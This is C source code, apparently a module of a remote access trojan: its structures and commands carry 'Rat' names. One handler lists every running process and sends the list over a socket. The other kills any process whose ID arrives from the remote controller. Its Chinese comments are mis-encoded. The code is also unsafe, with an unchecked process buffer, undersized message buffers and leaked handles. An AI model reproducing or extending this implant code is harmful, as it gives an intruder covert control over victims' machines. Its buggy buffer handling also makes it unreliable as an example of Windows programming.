#include "ProcInfo.h"



//////////////////////////////////////////////////////////////////////////
//PROCVIEW����
//////////////////////////////////////////////////////////////////////////
BOOL ProcView(SOCKET sockfd,int dwRecvSize)
{
	int dwCount = 0;
	int dwSize = sizeof(RatProto) + sizeof(ProcInfo)*PROCNUMS;
	char* pData = (char*)malloc(dwSize);
	if (pData)
	{
		((RatProto*)pData)->RatId = PROC_VIEW;
		((RatProto*)pData)->RatCsm = NULL;
	}
	//�������̿���
	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
	PROCESSENTRY32 pe ={0};
	pe.dwSize = sizeof(PROCESSENTRY32);
	ProcInfo* pi = (ProcInfo*)(pData+sizeof(RatProto));
	BOOL flag = Process32First(handle,&pe);
	if (flag)
	{
		pi->pid = pe.th32ProcessID;
		sprintf(pi->Name,"%s",pe.szExeFile);
		pi++;
		dwCount++;
	}
	while (Process32Next(handle,&pe))
	{
		pi->pid = pe.th32ProcessID;
		sprintf(pi->Name,"%s",pe.szExeFile);
		pi++;
		dwCount++;
	}

	dwSize = sizeof(RatProto)+sizeof(ProcInfo)*dwCount;
	((RatProto*)pData)->RatLen = dwSize;
	flag = SendCmd(sockfd,pData,dwSize);
	free(pData);
	if (!flag)
	{
		SocketError(sockfd);
		return FALSE;
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//ɾ��PIDָ������
//////////////////////////////////////////////////////////////////////////
BOOL ProcDelete(SOCKET sockfd,int dwRecvSize)
{
	int dwSize = sizeof(RatProto)+strlen("ɾ���ɹ���  ");
	char* szMsg = (char*)malloc(dwSize);
	if (szMsg==NULL)
	{
		return FALSE;
	}
	RatProto ratPro;
	ratPro.RatId = PROC_DELETE;
	ratPro.RatLen = dwSize;
	memcpy(szMsg,&ratPro,sizeof(RatProto));
	char* pMsg = szMsg+sizeof(RatProto);
	int pid = *((int*)(szRecvCmd+sizeof(RatProto)));
	BOOL bRet = FALSE;
	if (pid != 0)
	{
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE,FALSE,pid);
		if (hProcess)
		{
			bRet = TerminateProcess(hProcess,NULL);
			if (bRet)
			{
				sprintf(pMsg,"%s","ɾ���ɹ���\0");
				CloseHandle(hProcess);
			}
		}
		else
		{
			sprintf(pMsg,"%s","ɾ��ʧ�ܣ�\0");
		}
	}
	else
	{
		bRet = TRUE;
		sprintf(pMsg,"%s","ˢ�³ɹ���\0");
	}
	if (bRet)
	{
		Sleep(100);
		ProcView(sockfd,dwRecvSize);
	}
	Sleep(100);
	SendCmd(sockfd,szMsg,dwSize);
	free(szMsg);


	return bRet;
}
